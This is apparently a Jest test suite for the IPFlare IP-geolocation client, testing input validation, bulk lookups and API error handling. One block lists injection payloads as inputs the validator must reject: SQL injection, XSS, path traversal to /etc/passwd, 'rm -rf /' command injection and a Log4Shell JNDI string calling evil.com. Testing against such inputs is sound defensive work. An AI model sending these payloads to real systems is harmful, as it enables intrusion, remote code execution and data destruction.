import axios from "axios";
import {
  IPFlare,
  type IPGeolocationResponse,
  type BulkLookupResponse,
  type IPGeolocationOptions,
  isIPGeolocationError,
  isIPGeolocationSuccess,
} from "../index";

// Mock axios
jest.mock("axios");
const mockedAxios = axios as jest.Mocked<typeof axios>;

describe("IPGeolocation", () => {
  const mockApiKey = "test-api-key";
  let geolocator: IPFlare;

  beforeEach(() => {
    // Reset all mocks before each test
    jest.clearAllMocks();

    // Setup axios.isAxiosError mock
    mockedAxios.isAxiosError = jest.fn((error): error is any => {
      return error && error.isAxiosError === true;
    }) as any;

    // Create a new instance for each test
    geolocator = new IPFlare({ apiKey: mockApiKey });

    // Setup default axios create mock
    mockedAxios.create.mockReturnValue(mockedAxios);
  });

  describe("constructor", () => {
    it("should throw error when API key is not provided", () => {
      expect(() => new IPFlare({} as IPGeolocationOptions)).toThrow(
        "API key is required"
      );
    });

    it("should throw TypeError when API key is not a string", () => {
      expect(() => new IPFlare({ apiKey: 123 as any })).toThrow(
        "API key must be a string"
      );
    });

    it("should throw error when API key is empty string", () => {
      expect(() => new IPFlare({ apiKey: "   " })).toThrow(
        "API key cannot be empty"
      );
    });

    it("should create instance with custom baseURL", () => {
      const customBaseURL = "https://custom.api.com";
      new IPFlare({ apiKey: mockApiKey, baseURL: customBaseURL });

      expect(mockedAxios.create).toHaveBeenCalledWith({
        baseURL: customBaseURL,
        timeout: 10000,
        headers: {
          "X-API-Key": mockApiKey,
          "Content-Type": "application/json",
        },
      });
    });

    it("should create instance with custom timeout", () => {
      const customTimeout = 5000;
      new IPFlare({ apiKey: mockApiKey, timeout: customTimeout });

      expect(mockedAxios.create).toHaveBeenCalledWith({
        baseURL: "https://api.ipflare.io",
        timeout: customTimeout,
        headers: {
          "X-API-Key": mockApiKey,
          "Content-Type": "application/json",
        },
      });
    });
  });

  describe("lookup", () => {
    const mockResponse: IPGeolocationResponse = {
      ip: "178.238.11.6",
      city: "Mountain View",
      country_code: "US",
      in_eu: false,
      land_locked: false,
    };

    beforeEach(() => {
      mockedAxios.get.mockResolvedValue({ data: mockResponse });
    });

    it("should throw error when IP is not provided", async () => {
      await expect(geolocator.lookup("")).rejects.toThrow(
        "IP address is required"
      );
    });

    it("should throw TypeError when IP is not a string", async () => {
      await expect(geolocator.lookup(123 as any)).rejects.toThrow(
        "IP address must be a string"
      );
    });

    it("should throw error for invalid IPv4 format", async () => {
      await expect(geolocator.lookup("999.999.999.999")).rejects.toThrow(
        "Invalid IP address format: 999.999.999.999"
      );
    });

    it("should throw error for invalid IPv6 format", async () => {
      await expect(geolocator.lookup("gggg::1")).rejects.toThrow(
        "Invalid IP address format: gggg::1"
      );
    });

    it("should fetch geolocation data for valid IPv4", async () => {
      const result = await geolocator.lookup("178.238.11.6");

      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: {},
      });
      expect(result).toEqual(mockResponse);
    });

    it("should fetch geolocation data for valid IPv6", async () => {
      const ipv6 = "2001:4860:4860::8888";
      const result = await geolocator.lookup(ipv6);

      expect(mockedAxios.get).toHaveBeenCalledWith(`/${ipv6}`, {
        params: {},
      });
      expect(result).toEqual(mockResponse);
    });

    it("should trim whitespace from IP address", async () => {
      const result = await geolocator.lookup("  178.238.11.6  ");

      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: {},
      });
      expect(result).toEqual(mockResponse);
    });

    it("should include optional fields in request", async () => {
      await geolocator.lookup("178.238.11.6", {
        include: {
          asn: true,
          isp: true,
        },
      });

      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: { fields: "asn,isp" },
      });
    });

    it("should handle 401 unauthorized error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 401,
      };
      mockedAxios.get.mockRejectedValue(errorResponse);

      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
        "Invalid API key"
      );
    });

    it("should handle 429 rate limit error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 429,
      };
      mockedAxios.get.mockRejectedValue(errorResponse);

      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
        "Rate limit exceeded"
      );
    });

    it("should handle API errors with custom message", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        data: { error: "Custom error message" },
        status: 400,
      };
      mockedAxios.get.mockRejectedValue(errorResponse);

      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
        "Custom error message"
      );
    });

    it("should handle rate limit errors specifically", async () => {
      const rateLimitError = new Error("API Error");
      (rateLimitError as any).isAxiosError = true;
      (rateLimitError as any).response = {
        status: 429,
        data: { error: "Rate limit exceeded" },
      };
      mockedAxios.get.mockRejectedValue(rateLimitError);

      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
        "Rate limit exceeded"
      );
    });

    it("should handle generic errors", async () => {
      mockedAxios.get.mockRejectedValue(new Error("Network error"));

      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
        "Failed to fetch geolocation data"
      );
    });
  });

  describe("bulkLookup", () => {
    const mockBulkResponse: BulkLookupResponse = [
      {
        ip: "178.238.11.6",
        status: "success",
        data: {
          ip: "178.238.11.6",
          city: "Mountain View",
          country_code: "US",
          in_eu: false,
          land_locked: false,
        },
      },
      {
        ip: "invalid-ip",
        status: "error",
        error_message: "Invalid IP address",
      },
    ];

    beforeEach(() => {
      mockedAxios.post.mockResolvedValue({
        data: { results: mockBulkResponse },
      });
    });

    it("should throw TypeError when IPs is not an array", async () => {
      await expect(
        geolocator.bulkLookup({ ips: "not-array" as any })
      ).rejects.toThrow("IPs must be an array");
    });

    it("should throw error when IPs array is empty", async () => {
      await expect(geolocator.bulkLookup({ ips: [] })).rejects.toThrow(
        "At least one IP address is required"
      );
    });

    it("should throw error when IPs array exceeds 500", async () => {
      const tooManyIPs = new Array(501).fill("178.238.11.6");
      await expect(geolocator.bulkLookup({ ips: tooManyIPs })).rejects.toThrow(
        "Maximum of 500 IPs per request allowed"
      );
    });

    it("should throw error for invalid IP addresses in array", async () => {
      await expect(
        geolocator.bulkLookup({
          ips: ["178.238.11.6", "invalid-ip", "999.999.999.999"],
        })
      ).rejects.toThrow(
        "Invalid IP addresses found: invalid-ip, 999.999.999.999"
      );
    });

    it("should throw error for non-string values in IPs array", async () => {
      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6", 123, null] as any })
      ).rejects.toThrow("Invalid IP addresses found: 123, ");
    });

    it("should fetch bulk geolocation data for valid IPs", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["178.238.11.6", "1.1.1.1"],
      });

      expect(mockedAxios.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: {} }
      );
      expect(result).toEqual(mockBulkResponse);
    });

    it("should trim whitespace from IP addresses", async () => {
      await geolocator.bulkLookup({
        ips: ["  178.238.11.6  ", " 1.1.1.1 "],
      });

      expect(mockedAxios.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: {} }
      );
    });

    it("should include optional fields in bulk request", async () => {
      await geolocator.bulkLookup({
        ips: ["178.238.11.6", "1.1.1.1"],
        include: {
          asn: true,
          isp: true,
        },
      });

      expect(mockedAxios.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: { fields: "asn,isp" } }
      );
    });

    it("should handle 401 unauthorized error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 401,
      };
      mockedAxios.post.mockRejectedValue(errorResponse);

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("Invalid API key");
    });

    it("should handle 429 rate limit error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 429,
      };
      mockedAxios.post.mockRejectedValue(errorResponse);

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("Rate limit exceeded");
    });

    it("should handle rate limit with custom API message in bulk", async () => {
      const rateLimitError = new Error("API Error");
      (rateLimitError as any).isAxiosError = true;
      (rateLimitError as any).response = {
        status: 429,
        data: { error: "API quota exceeded - please try again later" },
      };
      mockedAxios.post.mockRejectedValue(rateLimitError);

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("API quota exceeded - please try again later");
    });

    it("should handle non-Error, non-AxiosError exceptions in bulk lookup", async () => {
      // This covers the final fallback case on line 253
      const weirdError = "Some weird non-Error exception";
      mockedAxios.post.mockRejectedValue(weirdError);

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("Failed to fetch bulk geolocation data");
    });

    it("should handle AxiosError without response in bulk lookup", async () => {
      // This covers the case where an AxiosError is thrown but has no response
      const networkError = new Error("Network Error");
      (networkError as any).isAxiosError = true;
      // No response property - simulates network failure
      mockedAxios.post.mockRejectedValue(networkError);

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("Network Error");
    });

    it("should handle invalid response format", async () => {
      mockedAxios.post.mockResolvedValue({
        data: { notResults: [] },
      });

      await expect(
        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
      ).rejects.toThrow("Invalid response format from API");
    });

    it("should handle a mix of valid and invalid IPs", async () => {
      const mockResponse: BulkLookupResponse = [
        {
          ip: "104.174.125.138",
          status: "success",
          data: {
            ip: "104.174.125.138",
            city: "Los Angeles",
            country_name: "United States",
            in_eu: false,
            land_locked: false,
            latitude: 34.0522,
            longitude: -118.2437,
          },
        },
        {
          ip: "not_a_valid_IP",
          status: "error",
          error_message: "Invalid IP address",
        },
        {
          ip: "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
          status: "success",
          data: {
            ip: "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
            city: "San Francisco",
            country_name: "United States",
            in_eu: false,
            land_locked: false,
            latitude: 37.7749,
            longitude: -122.4194,
          },
        },
      ];

      mockedAxios.post.mockResolvedValueOnce({
        data: { results: mockResponse },
      });

      // This should fail validation before making the API call
      await expect(
        geolocator.bulkLookup({
          ips: [
            "104.174.125.138",
            "not_a_valid_IP",
            "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
          ],
        })
      ).rejects.toThrow("Invalid IP addresses found: not_a_valid_IP");
    });

    it("should handle exactly 500 IPs", async () => {
      const ips = new Array(500).fill("1.1.1.1");

      // Clear any previous mocks and set up new one for this test
      mockedAxios.post.mockClear();
      mockedAxios.post.mockResolvedValueOnce({
        data: {
          results: ips.map((ip) => ({
            ip,
            status: "success",
            data: { ip, in_eu: false, land_locked: false },
          })),
        },
      });

      // Should not throw - 500 IPs is the maximum allowed
      await expect(geolocator.bulkLookup({ ips })).resolves.toBeDefined();
    });
  });

  describe("Type Guards", () => {
    it("should correctly identify error responses", () => {
      const errorResponse = {
        ip: "invalid-ip",
        status: "error" as const,
        error_message: "Invalid IP",
      };

      expect(isIPGeolocationError(errorResponse)).toBe(true);
      expect(isIPGeolocationSuccess(errorResponse)).toBe(false);
    });

    it("should correctly identify success responses", () => {
      const successResponse = {
        ip: "178.238.11.6",
        status: "success" as const,
        data: {
          ip: "178.238.11.6",
          in_eu: false,
          land_locked: false,
        },
      };

      expect(isIPGeolocationSuccess(successResponse)).toBe(true);
      expect(isIPGeolocationError(successResponse)).toBe(false);
    });
  });

  describe("Edge Cases and Production Scenarios", () => {
    describe("IPv6 Address Variations", () => {
      const validIPv6Addresses = [
        "2001:0db8:0000:0000:0000:ff00:0042:8329",
        "2001:db8:0:0:0:ff00:42:8329",
        "2001:db8::ff00:42:8329",
        "::1",
        "fe80::1",
        "::ffff:192.0.2.1",
        "2001:db8:85a3::8a2e:370:7334",
        "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
      ];

      validIPv6Addresses.forEach((ip) => {
        it(`should accept valid IPv6: ${ip}`, async () => {
          mockedAxios.get.mockResolvedValue({
            data: { ip, in_eu: false, land_locked: false },
          });

          await expect(geolocator.lookup(ip)).resolves.toBeDefined();
          expect(mockedAxios.get).toHaveBeenCalledWith(`/${ip}`, {
            params: {},
          });
        });
      });

      const invalidIPv6Addresses = [
        "gggg::1",
        "2001:0db8:0000:0000:0000:ff00:0042:8329:extra",
        "2001:0db8::ff00::42:8329",
        ":::1",
        "2001:db8:85a3::8a2e:370g:7334",
      ];

      invalidIPv6Addresses.forEach((ip) => {
        it(`should reject invalid IPv6: ${ip}`, async () => {
          await expect(geolocator.lookup(ip)).rejects.toThrow(
            `Invalid IP address format: ${ip}`
          );
        });
      });
    });

    describe("IPv4 Edge Cases", () => {
      const validIPv4Addresses = [
        "0.0.0.0",
        "255.255.255.255",
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "8.8.8.8",
        "1.1.1.1",
      ];

      validIPv4Addresses.forEach((ip) => {
        it(`should accept valid IPv4: ${ip}`, async () => {
          mockedAxios.get.mockResolvedValue({
            data: { ip, in_eu: false, land_locked: false },
          });

          await expect(geolocator.lookup(ip)).resolves.toBeDefined();
        });
      });

      const invalidIPv4Addresses = [
        "256.1.1.1",
        "1.256.1.1",
        "1.1.256.1",
        "1.1.1.256",
        "999.999.999.999",
        "1.1.1",
        "1.1.1.1.1",
        "a.b.c.d",
        "192.168.1.1a",
        "192.168.1.",
        ".192.168.1.1",
        "192.168..1.1",
      ];

      invalidIPv4Addresses.forEach((ip) => {
        it(`should reject invalid IPv4: ${ip}`, async () => {
          await expect(geolocator.lookup(ip)).rejects.toThrow(
            `Invalid IP address format: ${ip}`
          );
        });
      });
    });

    describe("Special Characters and Injection Attempts", () => {
      const maliciousInputs = [
        "'; DROP TABLE ips; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "%00",
        "\n\r",
        "1.1.1.1; rm -rf /",
        " OR 1=1",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "%{(#_='multipart/form-data')}",
      ];

      maliciousInputs.forEach((input) => {
        it(`should safely reject malicious input: ${input.substring(
          0,
          20
        )}...`, async () => {
          await expect(geolocator.lookup(input)).rejects.toThrow(
            `Invalid IP address format: ${input}`
          );
        });
      });
    });

    describe("Bulk Lookup Edge Cases", () => {
      it("should handle mixed whitespace in bulk IPs", async () => {
        const ips = [
          "  1.1.1.1  ",
          "\t8.8.8.8\t",
          "\n192.168.1.1\n",
          " 10.0.0.1 ",
        ];

        mockedAxios.post.mockResolvedValue({
          data: { results: [] },
        });

        await geolocator.bulkLookup({ ips });

        expect(mockedAxios.post).toHaveBeenCalledWith(
          "/bulk-lookup",
          { ips: ["1.1.1.1", "8.8.8.8", "192.168.1.1", "10.0.0.1"] },
          { params: {} }
        );
      });

      it("should handle duplicate IPs in bulk request", async () => {
        const ips = ["1.1.1.1", "1.1.1.1", "8.8.8.8", "8.8.8.8"];

        mockedAxios.post.mockResolvedValue({
          data: { results: [] },
        });

        // Should not throw - duplicates are allowed
        await expect(geolocator.bulkLookup({ ips })).resolves.toBeDefined();
      });
    });

    describe("Network and Timeout Scenarios", () => {
      it("should handle network timeout", async () => {
        const timeoutError = new Error("timeout of 10000ms exceeded");
        (timeoutError as any).code = "ECONNABORTED";
        (timeoutError as any).isAxiosError = true;

        mockedAxios.get.mockRejectedValue(timeoutError);

        await expect(geolocator.lookup("1.1.1.1")).rejects.toThrow(
          "Failed to fetch geolocation data"
        );
      });

      it("should handle network connection errors", async () => {
        const networkError = new Error("getaddrinfo ENOTFOUND api.ipflare.io");
        (networkError as any).code = "ENOTFOUND";
        (networkError as any).isAxiosError = true;

        mockedAxios.get.mockRejectedValue(networkError);

        await expect(geolocator.lookup("1.1.1.1")).rejects.toThrow(
          "Failed to fetch geolocation data"
        );
      });

      it("should handle custom timeout configuration", () => {
        const customTimeout = 30000;
        new IPFlare({ apiKey: "test-key", timeout: customTimeout });

        expect(mockedAxios.create).toHaveBeenCalledWith(
          expect.objectContaining({
            timeout: customTimeout,
          })
        );
      });
    });

    describe("Response Data Validation", () => {
      it("should handle missing required fields in response", async () => {
        const incompleteResponse = {
          ip: "1.1.1.1",
          // Missing in_eu and land_locked
        };

        mockedAxios.get.mockResolvedValue({ data: incompleteResponse });

        // Should not throw - API might return partial data
        const result = await geolocator.lookup("1.1.1.1");
        expect(result).toEqual(incompleteResponse);
      });

      it("should handle null values in optional fields", async () => {
        const responseWithNulls = {
          ip: "1.1.1.1",
          city: null,
          country_code: null,
          in_eu: false,
          land_locked: false,
        };

        mockedAxios.get.mockResolvedValue({ data: responseWithNulls });

        const result = await geolocator.lookup("1.1.1.1");
        expect(result).toEqual(responseWithNulls);
      });

      it("should handle unexpected additional fields in response", async () => {
        const responseWithExtra = {
          ip: "1.1.1.1",
          in_eu: false,
          land_locked: false,
          unexpected_field: "value",
          another_unexpected: 123,
        };

        mockedAxios.get.mockResolvedValue({ data: responseWithExtra });

        const result = await geolocator.lookup("1.1.1.1");
        expect(result).toEqual(responseWithExtra);
      });
    });

    describe("Concurrent Requests", () => {
      it("should handle multiple concurrent lookup requests", async () => {
        const ips = ["1.1.1.1", "8.8.8.8", "192.168.1.1"];

        mockedAxios.get.mockImplementation((url) => {
          const ip = url.substring(1); // Remove leading /
          return Promise.resolve({
            data: { ip, in_eu: false, land_locked: false },
          });
        });

        const promises = ips.map((ip) => geolocator.lookup(ip));
        const results = await Promise.all(promises);

        expect(results).toHaveLength(3);
        results.forEach((result, index) => {
          expect(result.ip).toBe(ips[index]);
        });
      });

      it("should handle mixed success and failure in concurrent requests", async () => {
        mockedAxios.get
          .mockResolvedValueOnce({
            data: { ip: "1.1.1.1", in_eu: false, land_locked: false },
          })
          .mockRejectedValueOnce(new Error("Network error"))
          .mockResolvedValueOnce({
            data: { ip: "8.8.8.8", in_eu: false, land_locked: false },
          });

        const promises = [
          geolocator.lookup("1.1.1.1"),
          geolocator.lookup("192.168.1.1").catch((e) => ({ error: e.message })),
          geolocator.lookup("8.8.8.8"),
        ];

        const results = await Promise.all(promises);

        expect(results[0]).toHaveProperty("ip", "1.1.1.1");
        expect(results[1]).toHaveProperty("error");
        expect(results[2]).toHaveProperty("ip", "8.8.8.8");
      });
    });

    describe("Memory and Performance", () => {
      it("should handle very long IP lists efficiently", async () => {
        // Test with maximum allowed IPs
        const ips = new Array(500)
          .fill(null)
          .map((_, i) => `192.168.${Math.floor(i / 256)}.${i % 256}`);

        mockedAxios.post.mockResolvedValue({
          data: { results: [] },
        });

        const startTime = Date.now();
        await geolocator.bulkLookup({ ips });
        const endTime = Date.now();

        // Validation should be fast even for 500 IPs
        expect(endTime - startTime).toBeLessThan(100);
      });
    });

    describe("API Key Validation", () => {
      it("should handle very long API keys", () => {
        const longApiKey = "a".repeat(1000);
        expect(() => new IPFlare({ apiKey: longApiKey })).not.toThrow();
      });

      it("should handle API keys with special characters", () => {
        const specialApiKey = "test-key_123!@#$%^&*()";
        expect(() => new IPFlare({ apiKey: specialApiKey })).not.toThrow();
      });

      it("should handle API keys with unicode characters", () => {
        const unicodeApiKey = "test-key-🔑-测试";
        expect(() => new IPFlare({ apiKey: unicodeApiKey })).not.toThrow();
      });
    });
  });
});
